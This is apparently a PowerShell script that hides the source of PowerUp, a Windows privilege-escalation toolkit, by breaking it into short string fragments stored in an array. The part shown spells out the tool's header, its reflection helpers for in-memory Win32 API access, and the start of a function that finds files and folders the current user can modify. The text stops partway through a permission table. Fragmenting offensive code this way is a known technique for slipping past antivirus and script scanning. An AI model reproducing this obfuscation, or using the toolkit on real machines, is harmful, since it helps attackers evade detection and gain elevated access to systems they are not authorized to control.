$fragments = @('<#

PowerUp ','aims to be a',' clearinghou','se of common',' Windows pri','vilege escal','ation
vector','s that rely ','on misconfig','urations. Se','e README.md ','for more inf','ormation.

A','uthor: @harm','j0y
License:',' BSD 3-Claus','e
Required D','ependencies:',' None
Option','al Dependenc','ies: None

#','>

#Requires',' -Version 2
','

##########','############','############','############','##########
#','
# PSReflect',' code for Wi','ndows API ac','cess
# Autho','r: @mattifes','tation
#   h','ttps://raw.g','ithubusercon','tent.com/mat','tifestation/','PSReflect/ma','ster/PSRefle','ct.psm1
#
##','############','############','############','############','######

func','tion New-InM','emoryModule ','{
<#
.SYNOPS','IS

Creates ','an in-memory',' assembly an','d module

Au','thor: Matthe','w Graeber (@','mattifestati','on)
License:',' BSD 3-Claus','e
Required D','ependencies:',' None
Option','al Dependenc','ies: None

.','DESCRIPTION
','
When defini','ng custom en','ums, structs',', and unmana','ged function','s, it is
nec','essary to as','sociate to a','n assembly m','odule. This ','helper funct','ion
creates ','an in-memory',' module that',' can be pass','ed to the ''e','num'',
''struc','t'', and Add-','Win32Type fu','nctions.

.P','ARAMETER Mod','uleName

Spe','cifies the d','esired name ','for the in-m','emory assemb','ly and modul','e. If
Module','Name is not ','provided, it',' will defaul','t to a GUID.','

.EXAMPLE

','$Module = Ne','w-InMemoryMo','dule -Module','Name Win32
#','>

    [Diag','nostics.Code','Analysis.Sup','pressMessage','Attribute(''P','SUseShouldPr','ocessForStat','eChangingFun','ctions'', '''')',']
    [Cmdle','tBinding()]
','    Param (
','        [Par','ameter(Posit','ion = 0)]
  ','      [Valid','ateNotNullOr','Empty()]
   ','     [String',']
        $M','oduleName = ','[Guid]::NewG','uid().ToStri','ng()
    )

','    $AppDoma','in = [Reflec','tion.Assembl','y].Assembly.','GetType(''Sys','tem.AppDomai','n'').GetPrope','rty(''Current','Domain'').Get','Value($null,',' @())
    $L','oadedAssembl','ies = $AppDo','main.GetAsse','mblies()

  ','  foreach ($','Assembly in ','$LoadedAssem','blies) {
   ','     if ($As','sembly.FullN','ame -and ($A','ssembly.Full','Name.Split(''',','')[0] -eq $','ModuleName))',' {
         ','   return $A','ssembly
    ','    }
    }
','
    $DynAss','embly = New-','Object Refle','ction.Assemb','lyName($Modu','leName)
    ','$Domain = $A','ppDomain
   ',' $AssemblyBu','ilder = $Dom','ain.DefineDy','namicAssembl','y($DynAssemb','ly, ''Run'')
 ','   $ModuleBu','ilder = $Ass','emblyBuilder','.DefineDynam','icModule($Mo','duleName, $F','alse)

    r','eturn $Modul','eBuilder
}

','
# A helper ','function use','d to reduce ','typing while',' defining fu','nction
# pro','totypes for ','Add-Win32Typ','e.
function ','func {
    P','aram (
     ','   [Paramete','r(Position =',' 0, Mandator','y = $True)]
','        [Str','ing]
       ',' $DllName,

','        [Par','ameter(Posit','ion = 1, Man','datory = $Tr','ue)]
       ',' [string]
  ','      $Funct','ionName,

  ','      [Param','eter(Positio','n = 2, Manda','tory = $True',')]
        [','Type]
      ','  $ReturnTyp','e,

        ','[Parameter(P','osition = 3)',']
        [T','ype[]]
     ','   $Paramete','rTypes,

   ','     [Parame','ter(Position',' = 4)]
     ','   [Runtime.','InteropServi','ces.CallingC','onvention]
 ','       $Nati','veCallingCon','vention,

  ','      [Param','eter(Positio','n = 5)]
    ','    [Runtime','.InteropServ','ices.CharSet',']
        $C','harset,

   ','     [String',']
        $E','ntryPoint,

','        [Swi','tch]
       ',' $SetLastErr','or
    )

  ','  $Propertie','s = @{
     ','   DllName =',' $DllName
  ','      Functi','onName = $Fu','nctionName
 ','       Retur','nType = $Ret','urnType
    ','}

    if ($','ParameterTyp','es) { $Prope','rties[''Param','eterTypes''] ','= $Parameter','Types }
    ','if ($NativeC','allingConven','tion) { $Pro','perties[''Nat','iveCallingCo','nvention''] =',' $NativeCall','ingConventio','n }
    if (','$Charset) { ','$Properties[','''Charset''] =',' $Charset }
','    if ($Set','LastError) {',' $Properties','[''SetLastErr','or''] = $SetL','astError }
 ','   if ($Entr','yPoint) { $P','roperties[''E','ntryPoint''] ','= $EntryPoin','t }

    New','-Object PSOb','ject -Proper','ty $Properti','es
}


funct','ion Add-Win3','2Type
{
<#
.','SYNOPSIS

Cr','eates a .NET',' type for an',' unmanaged W','in32 functio','n.

Author: ','Matthew Grae','ber (@mattif','estation)
Li','cense: BSD 3','-Clause
Requ','ired Depende','ncies: None
','Optional Dep','endencies: f','unc

.DESCRI','PTION

Add-W','in32Type ena','bles you to ','easily inter','act with unm','anaged (i.e.','
Win32 unman','aged) functi','ons in Power','Shell. After',' providing
A','dd-Win32Type',' with a func','tion signatu','re, a .NET t','ype is creat','ed
using ref','lection (i.e','. csc.exe is',' never calle','d like with ','Add-Type).

','The ''func'' h','elper functi','on can be us','ed to reduce',' typing when',' defining
mu','ltiple funct','ion definiti','ons.

.PARAM','ETER DllName','

The name o','f the DLL.

','.PARAMETER F','unctionName
','
The name of',' the target ','function.

.','PARAMETER En','tryPoint

Th','e DLL export',' function na','me. This arg','ument should',' be specifie','d if the
spe','cified funct','ion name is ','different th','an the name ','of the expor','ted
function','.

.PARAMETE','R ReturnType','

The return',' type of the',' function.

','.PARAMETER P','arameterType','s

The funct','ion paramete','rs.

.PARAME','TER NativeCa','llingConvent','ion

Specifi','es the nativ','e calling co','nvention of ','the function','. Defaults t','o
stdcall.

','.PARAMETER C','harset

If y','ou need to e','xplicitly ca','ll an ''A'' or',' ''W'' Win32 f','unction, you',' can
specify',' the charact','er set.

.PA','RAMETER SetL','astError

In','dicates whet','her the call','ee calls the',' SetLastErro','r Win32 API
','function bef','ore returnin','g from the a','ttributed me','thod.

.PARA','METER Module','

The in-mem','ory module t','hat will hos','t the functi','ons. Use
New','-InMemoryMod','ule to defin','e an in-memo','ry module.

','.PARAMETER N','amespace

An',' optional na','mespace to p','repend to th','e type. Add-','Win32Type de','faults
to a ','namespace co','nsisting onl','y of the nam','e of the DLL','.

.EXAMPLE
','
$Mod = New-','InMemoryModu','le -ModuleNa','me Win32

$F','unctionDefin','itions = @(
','  (func kern','el32 GetProc','Address ([In','tPtr]) @([In','tPtr], [Stri','ng]) -Charse','t Ansi -SetL','astError),
 ',' (func kerne','l32 GetModul','eHandle ([In','tptr]) @([St','ring]) -SetL','astError),
 ',' (func ntdll',' RtlGetCurre','ntPeb ([IntP','tr]) @())
)
','
$Types = $F','unctionDefin','itions | Add','-Win32Type -','Module $Mod ','-Namespace ''','Win32''
$Kern','el32 = $Type','s[''kernel32''',']
$Ntdll = $','Types[''ntdll',''']
$Ntdll::R','tlGetCurrent','Peb()
$ntdll','base = $Kern','el32::GetMod','uleHandle(''n','tdll'')
$Kern','el32::GetPro','cAddress($nt','dllbase, ''Rt','lGetCurrentP','eb'')

.NOTES','

Inspired b','y Lee Holmes',''' Invoke-Win','dowsApi http','://poshcode.','org/2189

Wh','en defining ','multiple fun','ction protot','ypes, it is ','ideal to pro','vide
Add-Win','32Type with ','an array of ','function sig','natures. Tha','t way, they
','are all inco','rporated int','o the same i','n-memory mod','ule.
#>

   ',' [OutputType','([Hashtable]',')]
    Param','(
        [P','arameter(Man','datory=$True',', ValueFromP','ipelineByPro','pertyName=$T','rue)]
      ','  [String]
 ','       $DllN','ame,

      ','  [Parameter','(Mandatory=$','True, ValueF','romPipelineB','yPropertyNam','e=$True)]
  ','      [Strin','g]
        $','FunctionName',',

        [','Parameter(Va','lueFromPipel','ineByPropert','yName=$True)',']
        [S','tring]
     ','   $EntryPoi','nt,

       ',' [Parameter(','Mandatory=$T','rue, ValueFr','omPipelineBy','PropertyName','=$True)]
   ','     [Type]
','        $Ret','urnType,

  ','      [Param','eter(ValueFr','omPipelineBy','PropertyName','=$True)]
   ','     [Type[]',']
        $P','arameterType','s,

        ','[Parameter(V','alueFromPipe','lineByProper','tyName=$True',')]
        [','Runtime.Inte','ropServices.','CallingConve','ntion]
     ','   $NativeCa','llingConvent','ion = [Runti','me.InteropSe','rvices.Calli','ngConvention',']::StdCall,
','
        [Pa','rameter(Valu','eFromPipelin','eByPropertyN','ame=$True)]
','        [Run','time.Interop','Services.Cha','rSet]
      ','  $Charset =',' [Runtime.In','teropService','s.CharSet]::','Auto,

     ','   [Paramete','r(ValueFromP','ipelineByPro','pertyName=$T','rue)]
      ','  [Switch]
 ','       $SetL','astError,

 ','       [Para','meter(Mandat','ory=$True)]
','        [Val','idateScript(','{($_ -is [Re','flection.Emi','t.ModuleBuil','der]) -or ($','_ -is [Refle','ction.Assemb','ly])})]
    ','    $Module,','

        [V','alidateNotNu','ll()]
      ','  [String]
 ','       $Name','space = ''''
 ','   )

    BE','GIN
    {
  ','      $TypeH','ash = @{}
  ','  }

    PRO','CESS
    {
 ','       if ($','Module -is [','Reflection.A','ssembly])
  ','      {
    ','        if (','$Namespace)
','            ','{
          ','      $TypeH','ash[$DllName','] = $Module.','GetType("$Na','mespace.$Dll','Name")
     ','       }
   ','         els','e
          ','  {
        ','        $Typ','eHash[$DllNa','me] = $Modul','e.GetType($D','llName)
    ','        }
  ','      }
    ','    else
   ','     {
     ','       # Def','ine one type',' for each DL','L
          ','  if (!$Type','Hash.Contain','sKey($DllNam','e))
        ','    {
      ','          if',' ($Namespace',')
          ','      {
    ','            ','    $TypeHas','h[$DllName] ','= $Module.De','fineType("$N','amespace.$Dl','lName", ''Pub','lic,BeforeFi','eldInit'')
  ','            ','  }
        ','        else','
           ','     {
     ','            ','   $TypeHash','[$DllName] =',' $Module.Def','ineType($Dll','Name, ''Publi','c,BeforeFiel','dInit'')
    ','            ','}
          ','  }

       ','     $Method',' = $TypeHash','[$DllName].D','efineMethod(','
           ','     $Functi','onName,
    ','            ','''Public,Stat','ic,PinvokeIm','pl'',
       ','         $Re','turnType,
  ','            ','  $Parameter','Types)

    ','        # Ma','ke each ByRe','f parameter ','an Out param','eter
       ','     $i = 1
','            ','foreach($Par','ameter in $P','arameterType','s)
         ','   {
       ','         if ','($Parameter.','IsByRef)
   ','            ',' {
         ','           [','void] $Metho','d.DefinePara','meter($i, ''O','ut'', $null)
','            ','    }

     ','           $','i++
        ','    }

     ','       $DllI','mport = [Run','time.Interop','Services.Dll','ImportAttrib','ute]
       ','     $SetLas','tErrorField ','= $DllImport','.GetField(''S','etLastError''',')
          ','  $CallingCo','nventionFiel','d = $DllImpo','rt.GetField(','''CallingConv','ention'')
   ','         $Ch','arsetField =',' $DllImport.','GetField(''Ch','arSet'')
    ','        $Ent','ryPointField',' = $DllImpor','t.GetField(''','EntryPoint'')','
           ',' if ($SetLas','tError) { $S','LEValue = $T','rue } else {',' $SLEValue =',' $False }

 ','           i','f ($PSBoundP','arameters[''E','ntryPoint''])',' { $Exported','FuncName = $','EntryPoint }',' else { $Exp','ortedFuncNam','e = $Functio','nName }

   ','         # E','quivalent to',' C# version ','of [DllImpor','t(DllName)]
','            ','$Constructor',' = [Runtime.','InteropServi','ces.DllImpor','tAttribute].','GetConstruct','or([String])','
           ',' $DllImportA','ttribute = N','ew-Object Re','flection.Emi','t.CustomAttr','ibuteBuilder','($Constructo','r,
         ','       $DllN','ame, [Reflec','tion.Propert','yInfo[]] @()',', [Object[]]',' @(),
      ','          [R','eflection.Fi','eldInfo[]] @','($SetLastErr','orField,
   ','            ','            ','            ','    $Calling','ConventionFi','eld,
       ','            ','            ','            ','$CharsetFiel','d,
         ','            ','            ','          $E','ntryPointFie','ld),
       ','         [Ob','ject[]] @($S','LEValue,
   ','            ','            ','  ([Runtime.','InteropServi','ces.CallingC','onvention] $','NativeCallin','gConvention)',',
          ','            ','       ([Run','time.Interop','Services.Cha','rSet] $Chars','et),
       ','            ','          $E','xportedFuncN','ame))

     ','       $Meth','od.SetCustom','Attribute($D','llImportAttr','ibute)
     ','   }
    }

','    END
    ','{
        if',' ($Module -i','s [Reflectio','n.Assembly])','
        {
 ','           r','eturn $TypeH','ash
        ','}

        $','ReturnTypes ','= @{}

     ','   foreach (','$Key in $Typ','eHash.Keys)
','        {
  ','          $T','ype = $TypeH','ash[$Key].Cr','eateType()

','            ','$ReturnTypes','[$Key] = $Ty','pe
        }','

        re','turn $Return','Types
    }
','}


function',' psenum {
<#','
.SYNOPSIS

','Creates an i','n-memory enu','meration for',' use in your',' PowerShell ','session.

Au','thor: Matthe','w Graeber (@','mattifestati','on)
License:',' BSD 3-Claus','e
Required D','ependencies:',' None
Option','al Dependenc','ies: None

.','DESCRIPTION
','
The ''psenum',''' function f','acilitates t','he creation ','of enums ent','irely in
mem','ory using as',' close to a ','"C style" as',' PowerShell ','will allow.
','
.PARAMETER ','Module

The ','in-memory mo','dule that wi','ll host the ','enum. Use
Ne','w-InMemoryMo','dule to defi','ne an in-mem','ory module.
','
.PARAMETER ','FullName

Th','e fully-qual','ified name o','f the enum.
','
.PARAMETER ','Type

The ty','pe of each e','num element.','

.PARAMETER',' EnumElement','s

A hashtab','le of enum e','lements.

.P','ARAMETER Bit','field

Speci','fies that th','e enum shoul','d be treated',' as a bitfie','ld.

.EXAMPL','E

$Mod = Ne','w-InMemoryMo','dule -Module','Name Win32

','$ImageSubsys','tem = psenum',' $Mod PE.IMA','GE_SUBSYSTEM',' UInt16 @{
 ','   UNKNOWN =','            ','      0
    ','NATIVE =    ','            ','   1 # Image',' doesn''t req','uire a subsy','stem.
    WI','NDOWS_GUI = ','            ',' 2 # Image r','uns in the W','indows GUI s','ubsystem.
  ','  WINDOWS_CU','I =         ','     3 # Ima','ge runs in t','he Windows c','haracter sub','system.
    ','OS2_CUI =   ','            ','   5 # Image',' runs in the',' OS/2 charac','ter subsyste','m.
    POSIX','_CUI =      ','          7 ','# Image runs',' in the Posi','x character ','subsystem.
 ','   NATIVE_WI','NDOWS =     ','      8 # Im','age is a nat','ive Win9x dr','iver.
    WI','NDOWS_CE_GUI',' =          ',' 9 # Image r','uns in the W','indows CE su','bsystem.
   ',' EFI_APPLICA','TION =      ','    10
    E','FI_BOOT_SERV','ICE_DRIVER =','  11
    EFI','_RUNTIME_DRI','VER =       ','12
    EFI_R','OM =        ','          13','
    XBOX = ','            ','        14
 ','   WINDOWS_B','OOT_APPLICAT','ION = 16
}

','.NOTES

Powe','rShell puris','ts may disag','ree with the',' naming of t','his function',' but
again, ','this was dev','eloped in su','ch a way so ','as to emulat','e a "C style','"
definition',' as closely ','as possible.',' Sorry, I''m ','not going to',' name it
New','-Enum. :P
#>','

    [Outpu','tType([Type]',')]
    Param',' (
        [','Parameter(Po','sition = 0, ','Mandatory=$T','rue)]
      ','  [ValidateS','cript({($_ -','is [Reflecti','on.Emit.Modu','leBuilder]) ','-or ($_ -is ','[Reflection.','Assembly])})',']
        $M','odule,

    ','    [Paramet','er(Position ','= 1, Mandato','ry=$True)]
 ','       [Vali','dateNotNullO','rEmpty()]
  ','      [Strin','g]
        $','FullName,

 ','       [Para','meter(Positi','on = 2, Mand','atory=$True)',']
        [T','ype]
       ',' $Type,

   ','     [Parame','ter(Position',' = 3, Mandat','ory=$True)]
','        [Val','idateNotNull','OrEmpty()]
 ','       [Hash','table]
     ','   $EnumElem','ents,

     ','   [Switch]
','        $Bit','field
    )
','
    if ($Mo','dule -is [Re','flection.Ass','embly])
    ','{
        re','turn ($Modul','e.GetType($F','ullName))
  ','  }

    $En','umType = $Ty','pe -as [Type',']

    $Enum','Builder = $M','odule.Define','Enum($FullNa','me, ''Public''',', $EnumType)','

    if ($B','itfield)
   ',' {
        $','FlagsConstru','ctor = [Flag','sAttribute].','GetConstruct','or(@())
    ','    $FlagsCu','stomAttribut','e = New-Obje','ct Reflectio','n.Emit.Custo','mAttributeBu','ilder($Flags','Constructor,',' @())
      ','  $EnumBuild','er.SetCustom','Attribute($F','lagsCustomAt','tribute)
   ',' }

    fore','ach ($Key in',' $EnumElemen','ts.Keys)
   ',' {
        #',' Apply the s','pecified enu','m type to ea','ch element
 ','       $null',' = $EnumBuil','der.DefineLi','teral($Key, ','$EnumElement','s[$Key] -as ','$EnumType)
 ','   }

    $E','numBuilder.C','reateType()
','}


# A help','er function ','used to redu','ce typing wh','ile defining',' struct
# fi','elds.
functi','on field {
 ','   Param (
 ','       [Para','meter(Positi','on = 0, Mand','atory=$True)',']
        [U','Int16]
     ','   $Position',',

        [','Parameter(Po','sition = 1, ','Mandatory=$T','rue)]
      ','  [Type]
   ','     $Type,
','
        [Pa','rameter(Posi','tion = 2)]
 ','       [UInt','16]
        ','$Offset,

  ','      [Objec','t[]]
       ',' $MarshalAs
','    )

    @','{
        Po','sition = $Po','sition
     ','   Type = $T','ype -as [Typ','e]
        O','ffset = $Off','set
        ','MarshalAs = ','$MarshalAs
 ','   }
}


fun','ction struct','
{
<#
.SYNOP','SIS

Creates',' an in-memor','y struct for',' use in your',' PowerShell ','session.

Au','thor: Matthe','w Graeber (@','mattifestati','on)
License:',' BSD 3-Claus','e
Required D','ependencies:',' None
Option','al Dependenc','ies: field

','.DESCRIPTION','

The ''struc','t'' function ','facilitates ','the creation',' of structs ','entirely in
','memory using',' as close to',' a "C style"',' as PowerShe','ll will allo','w. Struct
fi','elds are spe','cified using',' a hashtable',' where each ','field of the',' struct
is c','omprosed of ','the order in',' which it sh','ould be defi','ned, its .NE','T
type, and ','optionally, ','its offset a','nd special m','arshaling at','tributes.

O','ne of the fe','atures of ''s','truct'' is th','at after you','r struct is ','defined,
it ','will come wi','th a built-i','n GetSize me','thod as well',' as an expli','cit
converte','r so that yo','u can easily',' cast an Int','Ptr to the s','truct withou','t
relying up','on calling S','izeOf and/or',' PtrToStruct','ure in the M','arshal
class','.

.PARAMETE','R Module

Th','e in-memory ','module that ','will host th','e struct. Us','e
New-InMemo','ryModule to ','define an in','-memory modu','le.

.PARAME','TER FullName','

The fully-','qualified na','me of the st','ruct.

.PARA','METER Struct','Fields

A ha','shtable of f','ields. Use t','he ''field'' h','elper functi','on to ease
d','efining each',' field.

.PA','RAMETER Pack','ingSize

Spe','cifies the m','emory alignm','ent of field','s.

.PARAMET','ER ExplicitL','ayout

Indic','ates that an',' explicit of','fset for eac','h field will',' be specifie','d.

.EXAMPLE','

$Mod = New','-InMemoryMod','ule -ModuleN','ame Win32

$','ImageDosSign','ature = psen','um $Mod PE.I','MAGE_DOS_SIG','NATURE UInt1','6 @{
    DOS','_SIGNATURE =','    0x5A4D
 ','   OS2_SIGNA','TURE =    0x','454E
    OS2','_SIGNATURE_L','E = 0x454C
 ','   VXD_SIGNA','TURE =    0x','454C
}

$Ima','geDosHeader ','= struct $Mo','d PE.IMAGE_D','OS_HEADER @{','
    e_magic',' =    field ','0 $ImageDosS','ignature
   ',' e_cblp =   ','  field 1 UI','nt16
    e_c','p =       fi','eld 2 UInt16','
    e_crlc ','=     field ','3 UInt16
   ',' e_cparhdr =','  field 4 UI','nt16
    e_m','inalloc = fi','eld 5 UInt16','
    e_maxal','loc = field ','6 UInt16
   ',' e_ss =     ','  field 7 UI','nt16
    e_s','p =       fi','eld 8 UInt16','
    e_csum ','=     field ','9 UInt16
   ',' e_ip =     ','  field 10 U','Int16
    e_','cs =       f','ield 11 UInt','16
    e_lfa','rlc =   fiel','d 12 UInt16
','    e_ovno =','     field 1','3 UInt16
   ',' e_res =    ','  field 14 U','Int16[] -Mar','shalAs @(''By','ValArray'', 4',')
    e_oemi','d =    field',' 15 UInt16
 ','   e_oeminfo',' =  field 16',' UInt16
    ','e_res2 =    ',' field 17 UI','nt16[] -Mars','halAs @(''ByV','alArray'', 10',')
    e_lfan','ew =   field',' 18 Int32
}
','
# Example o','f using an e','xplicit layo','ut in order ','to create a ','union.
$Test','Union = stru','ct $Mod Test','Union @{
   ',' field1 = fi','eld 0 UInt32',' 0
    field','2 = field 1 ','IntPtr 0
} -','ExplicitLayo','ut

.NOTES

','PowerShell p','urists may d','isagree with',' the naming ','of this func','tion but
aga','in, this was',' developed i','n such a way',' so as to em','ulate a "C s','tyle"
defini','tion as clos','ely as possi','ble. Sorry, ','I''m not goin','g to name it','
New-Struct.',' :P
#>

    ','[OutputType(','[Type])]
   ',' Param (
   ','     [Parame','ter(Position',' = 1, Mandat','ory=$True)]
','        [Val','idateScript(','{($_ -is [Re','flection.Emi','t.ModuleBuil','der]) -or ($','_ -is [Refle','ction.Assemb','ly])})]
    ','    $Module,','

        [P','arameter(Pos','ition = 2, M','andatory=$Tr','ue)]
       ',' [ValidateNo','tNullOrEmpty','()]
        ','[String]
   ','     $FullNa','me,

       ',' [Parameter(','Position = 3',', Mandatory=','$True)]
    ','    [Validat','eNotNullOrEm','pty()]
     ','   [Hashtabl','e]
        $','StructFields',',

        [','Reflection.E','mit.PackingS','ize]
       ',' $PackingSiz','e = [Reflect','ion.Emit.Pac','kingSize]::U','nspecified,
','
        [Sw','itch]
      ','  $ExplicitL','ayout
    )
','
    if ($Mo','dule -is [Re','flection.Ass','embly])
    ','{
        re','turn ($Modul','e.GetType($F','ullName))
  ','  }

    [Re','flection.Typ','eAttributes]',' $StructAttr','ibutes = ''An','siClass,
   ','     Class,
','        Publ','ic,
        ','Sealed,
    ','    BeforeFi','eldInit''

  ','  if ($Expli','citLayout)
 ','   {
       ',' $StructAttr','ibutes = $St','ructAttribut','es -bor [Ref','lection.Type','Attributes]:',':ExplicitLay','out
    }
  ','  else
    {','
        $St','ructAttribut','es = $Struct','Attributes -','bor [Reflect','ion.TypeAttr','ibutes]::Seq','uentialLayou','t
    }

   ',' $StructBuil','der = $Modul','e.DefineType','($FullName, ','$StructAttri','butes, [Valu','eType], $Pac','kingSize)
  ','  $Construct','orInfo = [Ru','ntime.Intero','pServices.Ma','rshalAsAttri','bute].GetCon','structors()[','0]
    $Size','Const = @([R','untime.Inter','opServices.M','arshalAsAttr','ibute].GetFi','eld(''SizeCon','st''))

    $','Fields = New','-Object Hash','table[]($Str','uctFields.Co','unt)

    # ','Sort each fi','eld accordin','g to the ord','ers specifie','d
    # Unfo','rtunately, P','Sv2 doesn''t ','have the lux','ury of the
 ','   # hashtab','le [Ordered]',' accelerator','.
    foreac','h ($Field in',' $StructFiel','ds.Keys)
   ',' {
        $','Index = $Str','uctFields[$F','ield][''Posit','ion'']
      ','  $Fields[$I','ndex] = @{Fi','eldName = $F','ield; Proper','ties = $Stru','ctFields[$Fi','eld]}
    }
','
    foreach',' ($Field in ','$Fields)
   ',' {
        $','FieldName = ','$Field[''Fiel','dName'']
    ','    $FieldPr','op = $Field[','''Properties''',']

        $','Offset = $Fi','eldProp[''Off','set'']
      ','  $Type = $F','ieldProp[''Ty','pe'']
       ',' $MarshalAs ','= $FieldProp','[''MarshalAs''',']

        $','NewField = $','StructBuilde','r.DefineFiel','d($FieldName',', $Type, ''Pu','blic'')

    ','    if ($Mar','shalAs)
    ','    {
      ','      $Unman','agedType = $','MarshalAs[0]',' -as ([Runti','me.InteropSe','rvices.Unman','agedType])
 ','           i','f ($MarshalA','s[1])
      ','      {
    ','            ','$Size = $Mar','shalAs[1]
  ','            ','  $AttribBui','lder = New-O','bject Reflec','tion.Emit.Cu','stomAttribut','eBuilder($Co','nstructorInf','o,
         ','           $','UnmanagedTyp','e, $SizeCons','t, @($Size))','
           ',' }
         ','   else
    ','        {
  ','            ','  $AttribBui','lder = New-O','bject Reflec','tion.Emit.Cu','stomAttribut','eBuilder($Co','nstructorInf','o, [Object[]','] @($Unmanag','edType))
   ','         }

','            ','$NewField.Se','tCustomAttri','bute($Attrib','Builder)
   ','     }

    ','    if ($Exp','licitLayout)',' { $NewField','.SetOffset($','Offset) }
  ','  }

    # M','ake the stru','ct aware of ','its own size','.
    # No m','ore having t','o call [Runt','ime.InteropS','ervices.Mars','hal]::SizeOf','!
    $SizeM','ethod = $Str','uctBuilder.D','efineMethod(','''GetSize'',
 ','       ''Publ','ic, Static'',','
        [In','t],
        ','[Type[]] @()',')
    $ILGen','erator = $Si','zeMethod.Get','ILGenerator(',')
    # Than','ks for the h','elp, Jason S','hirk!
    $I','LGenerator.E','mit([Reflect','ion.Emit.OpC','odes]::Ldtok','en, $StructB','uilder)
    ','$ILGenerator','.Emit([Refle','ction.Emit.O','pCodes]::Cal','l,
        [','Type].GetMet','hod(''GetType','FromHandle'')',')
    $ILGen','erator.Emit(','[Reflection.','Emit.OpCodes',']::Call,
   ','     [Runtim','e.InteropSer','vices.Marsha','l].GetMethod','(''SizeOf'', [','Type[]] @([T','ype])))
    ','$ILGenerator','.Emit([Refle','ction.Emit.O','pCodes]::Ret',')

    # All','ow for expli','cit casting ','from an IntP','tr
    # No ','more having ','to call [Run','time.Interop','Services.Mar','shal]::PtrTo','Structure!
 ','   $Implicit','Converter = ','$StructBuild','er.DefineMet','hod(''op_Impl','icit'',
     ','   ''PrivateS','cope, Public',', Static, Hi','deBySig, Spe','cialName'',
 ','       $Stru','ctBuilder,
 ','       [Type','[]] @([IntPt','r]))
    $IL','Generator2 =',' $ImplicitCo','nverter.GetI','LGenerator()','
    $ILGene','rator2.Emit(','[Reflection.','Emit.OpCodes',']::Nop)
    ','$ILGenerator','2.Emit([Refl','ection.Emit.','OpCodes]::Ld','arg_0)
    $','ILGenerator2','.Emit([Refle','ction.Emit.O','pCodes]::Ldt','oken, $Struc','tBuilder)
  ','  $ILGenerat','or2.Emit([Re','flection.Emi','t.OpCodes]::','Call,
      ','  [Type].Get','Method(''GetT','ypeFromHandl','e''))
    $IL','Generator2.E','mit([Reflect','ion.Emit.OpC','odes]::Call,','
        [Ru','ntime.Intero','pServices.Ma','rshal].GetMe','thod(''PtrToS','tructure'', [','Type[]] @([I','ntPtr], [Typ','e])))
    $I','LGenerator2.','Emit([Reflec','tion.Emit.Op','Codes]::Unbo','x_Any, $Stru','ctBuilder)
 ','   $ILGenera','tor2.Emit([R','eflection.Em','it.OpCodes]:',':Ret)

    $','StructBuilde','r.CreateType','()
}


#####','############','############','############','############','###
#
# Powe','rUp Helpers
','#
##########','############','############','############','##########

','function Get','-ModifiableP','ath {
<#
.SY','NOPSIS

Pars','es a passed ','string conta','ining multip','le possible ','file/folder ','paths and re','turns
the fi','le paths whe','re the curre','nt user has ','modification',' rights.

Au','thor: Will S','chroeder (@h','armj0y)  
Li','cense: BSD 3','-Clause  
Re','quired Depen','dencies: Non','e  

.DESCRI','PTION

Takes',' a complex p','ath specific','ation of an ','initial file','/folder path',' with possib','le
configura','tion files, ','''tokenizes'' ','the string i','n a number o','f possible w','ays, and
enu','merates the ','ACLs for eac','h path that ','currently ex','ists on the ','system. Any ','path that
th','e current us','er has modif','ication righ','ts on is ret','urned in a c','ustom object',' that contai','ns
the modif','iable path, ','associated p','ermission se','t, and the I','dentityRefer','ence with th','e specified
','rights. The ','SID of the c','urrent user ','and any grou','p he/she are',' a part of a','re used as t','he
compariso','n set agains','t the parsed',' path DACLs.','

.PARAMETER',' Path

The s','tring path t','o parse for ','modifiable f','iles. Requir','ed

.PARAMET','ER Literal

','Switch. Trea','t all paths ','as literal (','i.e. don''t d','o ''tokenizat','ion'').

.EXA','MPLE

''"C:\T','emp\blah.exe','" -f "C:\Tem','p\config.ini','"'' | Get-Mod','ifiablePath
','
Path       ','            ','    Permissi','ons         ','       Ident','ityReference','
----       ','            ','    --------','---         ','       -----','------------','
C:\Temp\bla','h.exe       ','    {ReadAtt','ributes, Rea','dCo... NT AU','THORITY\Auth','entic...
C:\','Temp\config.','ini         ','{ReadAttribu','tes, ReadCo.','.. NT AUTHOR','ITY\Authenti','c...

.EXAMP','LE

Get-Chil','dItem C:\Vul','n\ -Recurse ','| Get-Modifi','ablePath

Pa','th          ','            ',' Permissions','            ','    Identity','Reference
--','--          ','            ',' -----------','            ','    --------','---------
C:','\Vuln\blah.b','at          ',' {ReadAttrib','utes, ReadCo','... NT AUTHO','RITY\Authent','ic...
C:\Vul','n\config.ini','         {Re','adAttributes',', ReadCo... ','NT AUTHORITY','\Authentic..','.
...

.OUTP','UTS

PowerUp','.TokenPrivil','ege.Modifiab','lePath

Cust','om PSObject ','containing t','he Permissio','ns, Modifiab','lePath, Iden','tityReferenc','e for
a modi','fiable path.','
#>

    [Di','agnostics.Co','deAnalysis.S','uppressMessa','geAttribute(','''PSShouldPro','cess'', '''')]
','    [OutputT','ype(''PowerUp','.ModifiableP','ath'')]
    [','CmdletBindin','g()]
    Par','am(
        ','[Parameter(P','osition = 0,',' Mandatory =',' $True, Valu','eFromPipelin','e = $True, V','alueFromPipe','lineByProper','tyName = $Tr','ue)]
       ',' [Alias(''Ful','lName'')]
   ','     [String','[]]
        ','$Path,

    ','    [Alias(''','LiteralPaths',''')]
        ','[Switch]
   ','     $Litera','l
    )

   ',' BEGIN {
   ','     # from ','http://stack','overflow.com','/questions/2','8029872/retr','ieving-secur','ity-descript','or-and-getti','ng-number-fo','r-filesystem','rights
     ','   $AccessMa','sk = @{
    ','        [uin','t32]''0x80000','000'' = ''Gene','ricRead''
   ','         [ui','nt32]''0x4000','0000'' = ''Gen','ericWrite''
 ','           [','uint32]''0x20','000000'' = ''G','enericExecut','e''
         ','   [uint32]''','0x10000000'' ','= ''GenericAl','l''
         ','   [uint32]''','0x02000000'' ','= ''MaximumAl','lowed''
     ','       [uint','32]''0x010000','00'' = ''Acces','sSystemSecur','ity''
       ','     [uint32',']''0x00100000',''' = ''Synchro','nize''
      ','      [uint3','2]''0x0008000','0'' = ''WriteO','wner''
      ','      [uint3','2]''0x0004000','0'' = ''WriteD','AC''
        ','    [uint32]','''0x00020000''',' = ''ReadCont','rol''
       ','     [uint32',']''0x00010000',''' = ''Delete''','
           ',' [uint32]''0x','00000100'' = ','''WriteAttrib','utes''
      ','      [uint3','2]''0x0000008','0'' = ''ReadAt','tributes''
  ','          [u','int32]''0x000','00040'' = ''De','leteChild''
 ','           [','uint32]''0x00','000020'' = ''E','xecute/Trave','rse''
       ','     [uint32',']''0x00000010',''' = ''WriteEx','tendedAttrib','utes''
